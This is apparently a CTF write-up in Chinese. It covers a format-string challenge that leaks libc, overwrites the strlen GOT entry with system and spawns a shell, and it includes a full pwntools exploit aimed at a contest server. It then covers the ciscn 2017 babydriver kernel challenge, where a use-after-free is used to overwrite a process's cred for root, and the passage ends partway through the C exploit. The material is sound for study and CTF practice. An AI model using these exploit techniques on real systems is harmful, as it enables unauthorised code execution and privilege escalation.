<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python">sprintf_got = <span class="hljs-number">0x0804A030</span>	<br>strlen_got = <span class="hljs-number">0x0804A024</span><br>offset = <span class="hljs-number">8</span><br><span class="hljs-comment"># leak libc</span><br>p = <span class="hljs-string">&#x27;A&#x27;</span> <span class="hljs-comment"># for alignment</span><br>p += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(offset + <span class="hljs-number">1</span>) + <span class="hljs-string">&#x27;$s&#x27;</span> + p32(sprintf_got)<br>s(p)<br>sprintf = u32(ru(<span class="hljs-string">&#x27;\xf7&#x27;</span>)[-<span class="hljs-number">3</span>:] + <span class="hljs-string">&#x27;\xf7&#x27;</span>)<br>li(<span class="hljs-string">&#x27;sprintf &#x27;</span> + <span class="hljs-built_in">hex</span>(sprintf))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">select:</span><br><span class="hljs-string">2: ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu10_amd64)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;sprintf&#x27;</span>, sprintf)<br>libc_base = sprintf - libc.dump(<span class="hljs-string">&#x27;sprintf&#x27;</span>)<br>li(<span class="hljs-string">&#x27;libc_base &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>system = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>li(<span class="hljs-string">&#x27;system &#x27;</span> + <span class="hljs-built_in">hex</span>(system))<br></code></pre></td></tr></table></figure>

<h4 id="修改strlen的got表内容为system"><a href="#修改strlen的got表内容为system" class="headerlink" title="修改strlen的got表内容为system"></a>修改strlen的got表内容为system</h4><p>使用字符串漏洞来进行地址写入, 使用’$hn’s 2字节分两次写入,先写小的再写大的, system的高位地址要比system的低位地址大,则先写小的.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">high_sys = system &gt;&gt; (<span class="hljs-number">8</span> * <span class="hljs-number">2</span>) <span class="hljs-comment">#获取高4位</span><br>low_sys = system &amp; <span class="hljs-number">0xFFFF</span>    <span class="hljs-comment">#获取低4位</span><br>li(<span class="hljs-string">&#x27;high_sys &#x27;</span> + <span class="hljs-built_in">hex</span>(high_sys))<br>li(<span class="hljs-string">&#x27;low_sys  &#x27;</span> + <span class="hljs-built_in">hex</span>(low_sys))<br><br><span class="hljs-comment"># modify strlen got</span><br>pre_len = <span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;Repeater:&#x27;</span>) + <span class="hljs-number">1</span> + <span class="hljs-number">4</span> + <span class="hljs-number">4</span> <span class="hljs-comment">#这里为数据已经打印的长度,后面写入长度需要减掉该长度</span><br>p = <span class="hljs-string">&#x27;A&#x27;</span> <span class="hljs-comment"># for alignment</span><br>p += p32(strlen_got + <span class="hljs-number">0</span>) <span class="hljs-comment"># 8</span><br>p += p32(strlen_got + <span class="hljs-number">2</span>) <span class="hljs-comment"># 9</span><br><br>p += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(low_sys - pre_len) + <span class="hljs-string">&#x27;c%&#x27;</span> + <span class="hljs-built_in">str</span>(offset + <span class="hljs-number">0</span>) + <span class="hljs-string">&#x27;$hn&#x27;</span><br>p += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(high_sys - low_sys) + <span class="hljs-string">&#x27;c%&#x27;</span> + <span class="hljs-built_in">str</span>(offset + <span class="hljs-number">1</span>) + <span class="hljs-string">&#x27;$hn&#x27;</span><br>   s(p)<br></code></pre></td></tr></table></figure>

<h3 id="get-shell-2"><a href="#get-shell-2" class="headerlink" title="get shell"></a>get shell</h3><p>使用’; ‘分割shell命令, 再调用strlen即调用system函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">sl(<span class="hljs-string">&#x27;; /bin/sh&#x27;</span>)<br></code></pre></td></tr></table></figure>



<h2 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment"># Author: I0gan</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]</span><br><span class="hljs-comment">#context.terminal = &#x27;konsole&#x27;</span><br><span class="hljs-comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="hljs-comment">#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><br>exeFile = <span class="hljs-string">&#x27;&#x27;</span><br>libFile = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br><br>remoteIp = <span class="hljs-string">&quot;node3.buuoj.cn&quot;</span><br>remotePort = <span class="hljs-number">29458</span><br><br>LOCAL = <span class="hljs-number">0</span><br>LIB   = <span class="hljs-number">0</span><br><br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>s   =  <span class="hljs-keyword">lambda</span> x : io.send(x)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>li    = <span class="hljs-keyword">lambda</span> x : log.info(x)<br>db    = <span class="hljs-keyword">lambda</span>   : gdb.attach(io)<br><br><span class="hljs-comment">#--------------------------Func-----------------------------</span><br><br><br><span class="hljs-comment">#--------------------------Exploit--------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>	sprintf_got = <span class="hljs-number">0x0804A030</span>	<br>	strlen_got = <span class="hljs-number">0x0804A024</span><br>	offset = <span class="hljs-number">8</span><br>	<span class="hljs-comment"># leak libc</span><br>	p = <span class="hljs-string">&#x27;A&#x27;</span> <span class="hljs-comment"># for alignment</span><br>	p += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(offset + <span class="hljs-number">1</span>) + <span class="hljs-string">&#x27;$s&#x27;</span> + p32(sprintf_got)<br>	s(p)<br>	sprintf = u32(ru(<span class="hljs-string">&#x27;\xf7&#x27;</span>)[-<span class="hljs-number">3</span>:] + <span class="hljs-string">&#x27;\xf7&#x27;</span>)<br>	li(<span class="hljs-string">&#x27;sprintf &#x27;</span> + <span class="hljs-built_in">hex</span>(sprintf))<br><br>	<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">	select:</span><br><span class="hljs-string">	2: ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu10_amd64)</span><br><span class="hljs-string">	&#x27;&#x27;&#x27;</span><br><br>	libc = LibcSearcher(<span class="hljs-string">&#x27;sprintf&#x27;</span>, sprintf)<br>	libc_base = sprintf - libc.dump(<span class="hljs-string">&#x27;sprintf&#x27;</span>)<br>	li(<span class="hljs-string">&#x27;libc_base &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>	system = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>	li(<span class="hljs-string">&#x27;system &#x27;</span> + <span class="hljs-built_in">hex</span>(system))<br><br>	high_sys = system &gt;&gt; (<span class="hljs-number">8</span> * <span class="hljs-number">2</span>)<br>	low_sys = system &amp; <span class="hljs-number">0xFFFF</span><br>	li(<span class="hljs-string">&#x27;high_sys &#x27;</span> + <span class="hljs-built_in">hex</span>(high_sys))<br>	li(<span class="hljs-string">&#x27;low_sys  &#x27;</span> + <span class="hljs-built_in">hex</span>(low_sys))<br><br>	<span class="hljs-comment"># modify strlen got</span><br>	pre_len = <span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;Repeater:&#x27;</span>) + <span class="hljs-number">1</span> + <span class="hljs-number">4</span> + <span class="hljs-number">4</span><br>	p = <span class="hljs-string">&#x27;A&#x27;</span> <span class="hljs-comment"># for alignment</span><br>	p += p32(strlen_got + <span class="hljs-number">0</span>) <span class="hljs-comment"># 8</span><br>	p += p32(strlen_got + <span class="hljs-number">2</span>) <span class="hljs-comment"># 9</span><br><br>	p += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(low_sys - pre_len) + <span class="hljs-string">&#x27;c%&#x27;</span> + <span class="hljs-built_in">str</span>(offset + <span class="hljs-number">0</span>) + <span class="hljs-string">&#x27;$hn&#x27;</span><br>	p += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(high_sys - low_sys) + <span class="hljs-string">&#x27;c%&#x27;</span> + <span class="hljs-built_in">str</span>(offset + <span class="hljs-number">1</span>) + <span class="hljs-string">&#x27;$hn&#x27;</span><br><br>	s(p)<br>	sl(<span class="hljs-string">&#x27;; /bin/sh&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>():<br>	ia()<br>	c()<br><br><span class="hljs-comment">#--------------------------Main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	<br>	<span class="hljs-keyword">if</span> LOCAL:<br>		exe = ELF(exeFile)<br>		<span class="hljs-keyword">if</span> LIB:<br>			lib = ELF(libFile)<br>			io = exe.process(env = &#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libFile&#125;)<br>		<span class="hljs-keyword">else</span>:<br>			io = exe.process()<br>	<br>	<span class="hljs-keyword">else</span>:<br>		io = remote(remoteIp, remotePort)<br>		<span class="hljs-keyword">if</span> LIB:<br>			lib = ELF(libFile)<br>	<br>	exploit()<br>	finish()<br><br></code></pre></td></tr></table></figure>



<h1 id="Kenel-pwn-ciscn-2017-baby-driver"><a href="#Kenel-pwn-ciscn-2017-baby-driver" class="headerlink" title="Kenel pwn ciscn 2017 baby driver"></a>Kenel pwn ciscn 2017 baby driver</h1><p>第一天真正开始做kernel pwn类的题, 于用户空间做的体确实有点不太一样, 利用从python 转向c语言写与驱动交互的程序, 找驱动程序的漏洞, 然后提权为root</p>
<h2 id="知识预备"><a href="#知识预备" class="headerlink" title="知识预备"></a>知识预备</h2><h3 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h3><p>在linux中每个进程都有它自己的权限,而标示着权限的那些信息,比如uid，gid等都是被放在一个叫cred的结构体当中的,也就是说每个进程中都有一个cred结构,如果能够修改进程的cred的uid和gid为0, 那么该进程的权限就为root权限了.<br>以下是cred结构体:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">cred</span> &#123;<br>    <span class="hljs-type">atomic_t</span>    usage;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span><br>    <span class="hljs-type">atomic_t</span>    subscribers;    <span class="hljs-comment">/* number of processes subscribed */</span><br>    <span class="hljs-type">void</span>        *put_addr;<br>    <span class="hljs-type">unsigned</span>    magic;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_MAGIC  0x43736564</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-type">kuid_t</span>      uid;        <span class="hljs-comment">/* real UID of the task */</span><br>    <span class="hljs-type">kgid_t</span>      gid;        <span class="hljs-comment">/* real GID of the task */</span><br>    <span class="hljs-type">kuid_t</span>      suid;       <span class="hljs-comment">/* saved UID of the task */</span><br>    <span class="hljs-type">kgid_t</span>      sgid;       <span class="hljs-comment">/* saved GID of the task */</span><br>    <span class="hljs-type">kuid_t</span>      euid;       <span class="hljs-comment">/* effective UID of the task */</span><br>    <span class="hljs-type">kgid_t</span>      egid;       <span class="hljs-comment">/* effective GID of the task */</span><br>    <span class="hljs-type">kuid_t</span>      fsuid;      <span class="hljs-comment">/* UID for VFS ops */</span><br>    <span class="hljs-type">kgid_t</span>      fsgid;      <span class="hljs-comment">/* GID for VFS ops */</span><br>    <span class="hljs-type">unsigned</span>    securebits; <span class="hljs-comment">/* SUID-less security management */</span><br>    <span class="hljs-type">kernel_cap_t</span>    cap_inheritable; <span class="hljs-comment">/* caps our children can inherit */</span><br>    <span class="hljs-type">kernel_cap_t</span>    cap_permitted;  <span class="hljs-comment">/* caps we&#x27;re permitted */</span><br>    <span class="hljs-type">kernel_cap_t</span>    cap_effective;  <span class="hljs-comment">/* caps we can actually use */</span><br>    <span class="hljs-type">kernel_cap_t</span>    cap_bset;   <span class="hljs-comment">/* capability bounding set */</span><br>    <span class="hljs-type">kernel_cap_t</span>    cap_ambient;    <span class="hljs-comment">/* Ambient capability set */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_KEYS</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>   jit_keyring;    <span class="hljs-comment">/* default keyring to attach requested * keys to */</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">key</span> __rcu *session_keyring; <span class="hljs-comment">/* keyring inherited over fork */</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">key</span>  *process_keyring; <span class="hljs-comment">/* keyring private to this process */</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">key</span>  *thread_keyring; <span class="hljs-comment">/* keyring private to this thread */</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">key</span>  *request_key_auth; <span class="hljs-comment">/* assumed request_key authority */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SECURITY</span><br>    <span class="hljs-type">void</span>        *security;  <span class="hljs-comment">/* subjective LSM security */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">user_struct</span> *user;   <span class="hljs-comment">/* real user ID subscription */</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">user_namespace</span> *user_ns; <span class="hljs-comment">/* user_ns the caps and keyrings are relative to. */</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">group_info</span> *group_info;  <span class="hljs-comment">/* supplementary groups for euid/fsgid */</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">rcu_head</span> rcu;        <span class="hljs-comment">/* RCU deletion hook */</span><br>&#125;;<br><br></code></pre></td></tr></table></figure>

<p>当我们是root权限的时候,我们的uid是等于0的,另外此版本的cred的大小是0xa8;</p>
<h3 id="SLAB-amp-SLUB"><a href="#SLAB-amp-SLUB" class="headerlink" title="SLAB &amp; SLUB"></a>SLAB &amp; SLUB</h3><p>  kernel中没有libc，但是仍然需要内存的分配和释放，这时就会使用到kmalloc&amp;kfree  API（相当于用户态使用的malloc&amp;free）。kmalloc&amp;kfree的实现是通过SLAB或SLUB分配器，现在一般是SLUB分配器。分配器是通过一个多级的结构进行管理。首先有cache层，cache是一个结构，其中保存的对象分为空对象、部分使用的对象和完全使用的对象进行管理。对象就是指内存对象，也就是用来分配或者已经分配的一部分内核空间。kmalloc使用了多个cache，每个cache对应一个2的幂次大小的一组内存对象。</p>
<p>  SLAB和SLUB都是内核的内存管理机制。为了提高效率，SLAB要求系统暂时保留已经释放的内核对象空间，以便下次申请时不需要再次初始化和分配。但是SLAB比较严格，需要再次申请的数据类型和大小与原先的完全一样，并且不同cache的无法分在同一页内；而SLUB较为宽松，和堆分配机制更为相似。</p>
<h2 id="设备程序分析"><a href="#设备程序分析" class="headerlink" title="设备程序分析"></a>设备程序分析</h2><p>驱动中存在一个结构体</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">struct babydev_struct&#123;<br>    char *device_buf;<br>    size_t device_buf_len;<br>&#125;;<br></code></pre></td></tr></table></figure>

<h3 id="babyopen函数"><a href="#babyopen函数" class="headerlink" title="babyopen函数"></a>babyopen函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">babyopen</span><span class="hljs-params">(inode *inode, file *filp)</span><br>&#123;<br>  __int64 v2; <span class="hljs-comment">// rdx</span><br><br>  _fentry__(inode, filp);<br>  <span class="hljs-comment">//对babydev_struct.device_buf 进行开辟一个0x40大小的内存</span><br>  babydev_struct.device_buf = (<span class="hljs-type">char</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="hljs-number">6</span>], <span class="hljs-number">0x24000C0</span>LL, <span class="hljs-number">0x40</span>LL);<br>  babydev_struct.device_buf_len = <span class="hljs-number">0x40</span>LL;<br>  printk(<span class="hljs-string">&quot;device open\n&quot;</span>, <span class="hljs-number">0x24000C0</span>LL, v2);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="babywrite函数"><a href="#babywrite函数" class="headerlink" title="babywrite函数"></a>babywrite函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall <span class="hljs-title function_">babywrite</span><span class="hljs-params">(file *filp, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *buffer, <span class="hljs-type">size_t</span> length, <span class="hljs-type">loff_t</span> *offset)</span><br>&#123;<br>  <span class="hljs-type">size_t</span> v4; <span class="hljs-comment">// rdx</span><br><br>  _fentry__(filp, buffer);<br>  <span class="hljs-keyword">if</span> ( babydev_struct.device_buf )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )<br>      copy_from_user(babydev_struct.device_buf, buffer, v4); <span class="hljs-comment">// 从用户空间拷贝数据到babydev_struct.device_buf</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="babyread-函数"><a href="#babyread-函数" class="headerlink" title="babyread 函数"></a>babyread 函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall <span class="hljs-title function_">babyread</span><span class="hljs-params">(file *filp, <span class="hljs-type">char</span> *buffer, <span class="hljs-type">size_t</span> length, <span class="hljs-type">loff_t</span> *offset)</span><br>&#123;<br>  <span class="hljs-type">size_t</span> v4; <span class="hljs-comment">// rdx</span><br><br>  _fentry__(filp, buffer);<br>  <span class="hljs-keyword">if</span> ( babydev_struct.device_buf )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )<br>      copy_to_user(buffer, babydev_struct.device_buf, v4); <span class="hljs-comment">//从内核中拷贝数据到用户空间</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="babyioctrl函数"><a href="#babyioctrl函数" class="headerlink" title="babyioctrl函数"></a>babyioctrl函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// local variable allocation has failed, the output may be wrong!</span><br><span class="hljs-type">void</span> __fastcall <span class="hljs-title function_">babyioctl</span><span class="hljs-params">(file *filp, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> command, <span class="hljs-type">unsigned</span> __int64 arg)</span><br>&#123;<br>  <span class="hljs-type">size_t</span> v3; <span class="hljs-comment">// rdx</span><br>  <span class="hljs-type">size_t</span> v4; <span class="hljs-comment">// rbx</span><br>  __int64 v5; <span class="hljs-comment">// rdx</span><br><br>  _fentry__(filp, *(_QWORD *)&amp;command);<br>  v4 = v3;<br>  <span class="hljs-keyword">if</span> ( command == <span class="hljs-number">0x10001</span> )<br>  &#123;<br>    kfree(babydev_struct.device_buf);<br>    babydev_struct.device_buf = (<span class="hljs-type">char</span> *)_kmalloc(v4, <span class="hljs-number">0x24000C0</span>LL);<span class="hljs-comment">// 根据用户来控制开辟内存空间的大小</span><br>    babydev_struct.device_buf_len = v4;<br>    printk(<span class="hljs-string">&quot;alloc done\n&quot;</span>, <span class="hljs-number">0x24000C0</span>LL, v5);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    printk(<span class="hljs-string">&quot;\x013defalut:arg is %ld\n&quot;</span>, v3, v3);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="babyrelease函数"><a href="#babyrelease函数" class="headerlink" title="babyrelease函数"></a>babyrelease函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">babyrelease</span><span class="hljs-params">(inode *inode, file *filp)</span><br>&#123;<br>  __int64 v2; <span class="hljs-comment">// rdx</span><br><br>  _fentry__(inode, filp);<br>  kfree(babydev_struct.device_buf);             <span class="hljs-comment">// 释放babydev_struct.device_buf, 对指针没有清0, 造成uaf漏洞</span><br>  printk(<span class="hljs-string">&quot;device release\n&quot;</span>, filp, v2);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="思路-11"><a href="#思路-11" class="headerlink" title="思路"></a>思路</h2><p>这个从用户态的pwn来看好像漏洞并不明显,但是我们现在是在内核态了,要把用户态的单线程的思维抛开了,从多线程的角度来思考。</p>
<ol>
<li>首先打开两次设备，通过ioctl将babydev_struct大小为的cred结构体的大小(不同版本kernel的可能不一样,需要通过源码去算);</li>
<li>然后释放其中一个设备，fork出一个新进程，此时这个新进程的cred 的空间就会重新开辟, 然而系统就会把之前大小一样空闲内存空间分配给它,。</li>
<li>第二个打开的文件描述符对这块空间进行写操作，只需要将uid和gid改为0，实现root提权</li>
</ol>
<h2 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// gcc exp.c -o exp -static -w</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> </span>&#123;<br>    	<span class="hljs-comment">// vul: uaf</span><br>        <span class="hljs-type">int</span> fd_1 = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, O_RDWR);<br>        <span 